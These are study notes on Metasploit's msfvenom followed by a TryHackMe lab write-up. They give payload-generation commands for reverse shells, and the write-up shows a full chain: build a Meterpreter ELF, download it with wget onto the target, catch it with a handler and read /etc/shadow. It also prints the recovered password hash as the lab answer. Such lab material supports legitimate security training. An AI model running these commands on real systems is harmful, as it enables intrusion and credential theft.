# Overview of Msfvenom and Payload Generation 

## Introduction 
Msfvenom is a tool that has replaced Msfpayload and Msfencode for generating payloads within the Metasploit framework. It allows the creation of payloads in various formats for different operating systems. 

## Key Points 

1. Functionality of Msfvenom 
• Msfvenom offers access to all payloads in the Metasploit framework. 

• It supports creating payloads in multiple formats (e. g. , PHP, exe, dll, elf) for different target systems (e. g. , Apple, Windows, Android, Linux). 

2. List of Available Payloads 

• Msfvenom provides a command to list all available payloads, which totals 562. 

• Examples of payloads include: 

• `aix/ppc/shell_bind_tcp`: Listens for a connection and starts a command shell. 

• `android/meterpreter/reverse_http`: Runs a meterpreter server on Android, using HTTP for communication. 

• `apple_ios/aarch64/meterpreter_reverse_tcp`: Executes a Meterpreter server payload for iOS devices. 

3. Output Formats 

• Users can generate standalone payloads (like a Windows executable) or output raw formats (like Python). 

• The command `msfvenom --list formats` lists supported output formats. 

4. Encoders 

• Encoders do not primarily aim to bypass antivirus but instead encode the payload. 

• Modern techniques for obfuscation and shellcode injection are more effective. 

• Example usage with encoding includes a command to encode a PHP Meterpreter payload in Base64. 

5. Generating a PHP Payload 

• Commands to generate PHP payloads using Msfvenom require specifying parameters such as local machine IP and port. 

• An example command creates a reverse shell for PHP, and the output is saved to a file without PHP tags, requiring manual editing before use. 

6. Handlers 

• Handlers are necessary to accept connections generated by MSFvenom payloads. 

• A familiar scenario includes exploiting a vulnerability in the DVWA where a PHP shell is created, and a Metasploit handler is started to accept connections. 

7. Setting Up the Listener 
• Using Multi Handler allows setting up to receive incoming connections. 

• The commands set the appropriate payload and listening parameters (LHOST and LPORT). 

8. Waiting for the Reverse Shell 

• Once the handler is up and running, it waits for the reverse shell connection to be triggered. 

• If set correctly, a connection will successfully establish a shell. 

9. Other Payload Types 

• Msfvenom can create various payloads based on the target machine’s configuration. 

• Examples include: 

• Linux ELF: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10. 10. X. X LPORT=XXXX -f elf &gt; rev_shell. elf` 

• Windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10. 10. X. X LPORT=XXXX -f exe &gt; rev_shell. exe` 

• PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10. 10. X. X LPORT=XXXX -f raw &gt; rev_shell. php` 

• ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10. 10. X. X LPORT=XXXX -f asp &gt; rev_shell. asp` 

• Python: `msfvenom -p cmd/unix/reverse_python LHOST=10. 10. X. X LPORT=XXXX -f raw &gt; rev_shell. py` 

## Conclusion 
Msfvenom is a powerful tool for generating various types of payloads suited for different exploits. Proper configuration of both the payload and the handler is essential for successful exploitation and command shell access. Each created payload must be aligned with the corresponding handler settings to establish effective communication between the attacker and the target system.


# Try Hack ME Write Up

MSFvenom allows us to generate payloads, and thats what we are doing in this task. 

- Q: What is the other user's password hash?

- A: $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0

- C:
   First we need to use:
   ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.33.99 LPORT=4444 -f elf > shell.elf

    chmod 777 shell.elf

    python3 -m http.server 9000
   ```
   On the other shell (Victim box), we need to download the file, so:
   ```bash
    wget http://10.10.33.99:9000/shell.elf
    sudo su
    chmod +x shell.elf (if needed)
    
   ```
   Now using msfconsole and a multi/handler, we generated a reverse shell with the same payload of the venom command. 

      ```bash
        msfconsole
        use  exploit/multi/handler 
        set LHOST machine_ip
        set LPORT 4444
        set payload linux/x86/meterpreter/reverse_tcp
        run
      ```
    Now just execute shell.elf on the target machine
    After getting the reverse shell, all its left is getting the other user's hash:
    ```bash
     cd etc
     cat shadow

    ``` 
    Claires hash is: $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0

HAPPY Hunting!

## Contribution
If u have a better way please tell me about it... im looking to learn best practices and best attack segments to became a better cybersecurity expert!
